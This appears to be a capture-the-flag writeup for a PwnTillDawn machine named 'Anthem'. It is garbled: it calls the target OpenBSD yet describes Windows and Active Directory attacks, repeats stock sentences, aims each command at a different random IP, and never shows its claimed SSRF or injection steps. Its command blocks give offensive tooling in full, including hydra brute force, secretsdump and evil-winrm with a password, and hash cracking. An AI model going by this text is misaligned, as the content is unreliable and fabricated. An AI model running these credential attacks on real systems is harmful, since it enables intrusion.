---
TitleSEO: "PwnTillDawn — Anthem (Hard OpenBSD) | ZureFX"
TitlePost: "PwnTillDawn — Anthem (Hard OpenBSD)"
Author: "ZureFX"
Description: "Full writeup for PwnTillDawn Anthem. Command Injection and SSRF to achieve hard compromise on OpenBSD."
Keywords: "hard, offsec, pwntilldawn"
URL: "https://zurefx.github.io/writeups/htb-anthem-742.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-anthem-742/"
Date: "2025-06-22"
Tags: "Hard, OffSec, PwnTillDawn"
Section: "writeups"
Lang: "en"
main_img: "htb-anthem-742"
Permalink: "/writeups/htb-anthem-742.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Anthem** is rated **Hard** on PwnTillDawn. It runs **OpenBSD** and the IP address during this analysis was `10.121.211.120`.

### Objectives

Authentication bypass was achieved through careful manipulation of the login mechanism. The kernel version was outdated and vulnerable to a publicly known exploit.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.123.79.5/FUZZ
gobuster dir -u http://10.60.173.245/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
nmap -sCV -p80,5986,3389 10.34.218.173 -oN scan.txt
gobuster dir -u http://10.99.23.177/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Command injection was possible through unsanitized user input in the search functionality. Post-exploitation enumeration revealed a path to domain administrator privileges.

### Service Enumeration

Group Policy Preferences contained encrypted but recoverable credentials. The scheduled task ran with elevated privileges and could be abused for escalation. Unconstrained delegation was enabled on the compromised machine.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.86.188.57
feroxbuster -h
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.62.14.170/FUZZ
gobuster dir -u http://10.25.2.195/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The service was running without proper input validation, leading to injection vulnerabilities. The target system was identified as running a vulnerable version of the service.

### SMB Enumeration

The database credentials were hardcoded in the application source code. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.59.32.241/FUZZ
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.70.17.205/FUZZ
```

The application stored sensitive credentials in an unencrypted configuration file. The backup files contained sensitive information that should not have been accessible. Unconstrained delegation was enabled on the compromised machine.

## Exploitation

### Vulnerability Identification

Group Policy Preferences contained encrypted but recoverable credentials. Unconstrained delegation was enabled on the compromised machine. Unconstrained delegation was enabled on the compromised machine.

Key finding: **SSRF**.

The service was running without proper input validation, leading to injection vulnerabilities. Group Policy Preferences contained encrypted but recoverable credentials.

### Initial Access

The web application was vulnerable to Server-Side Template Injection (SSTI). Group Policy Preferences contained encrypted but recoverable credentials.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
crackmapexec smb 10.74.42.81 -u administrator -p 'P@ssw0rd!' --shares
```

The application stored sensitive credentials in an unencrypted configuration file. Privilege escalation was possible due to misconfigured sudo permissions. Weak file permissions allowed modification of critical system files.

## Privilege Escalation

### Enumeration

The service account had excessive permissions assigned in Active Directory. The scheduled task ran with elevated privileges and could be abused for escalation. The kernel version was outdated and vulnerable to a publicly known exploit.

```powershell
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.24.112.115/FUZZ
nmap -sCV -p5985,8888,139 10.46.81.251 -oN scan.txt
nmap -sCV -p8888,8888,9200 10.127.52.180 -oN scan.txt
nmap -sCV -p636,23,8888 10.118.124.201 -oN scan.txt
```

### Exploitation

The target system was identified as running a vulnerable version of the service. Token impersonation allowed elevation to SYSTEM privileges on the target.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.56.105.78 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.60.219.90 -u administrator -p 'P@ssw0rd!'
impacket-secretsdump administrator:'P@ssw0rd!'@10.58.25.147
```

The target system was identified as running a vulnerable version of the service. Token impersonation allowed elevation to SYSTEM privileges on the target.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Initial enumeration revealed several interesting open ports on the target. Authentication bypass was achieved through careful manipulation of the login mechanism.

## Summary

### Tools Used

- `wmiexec`
- `gobuster`
- `hashcat`
- `rpcclient`
- `dcomexec`
- `atexec`

### Key Takeaways

- Command Injection
- SSRF
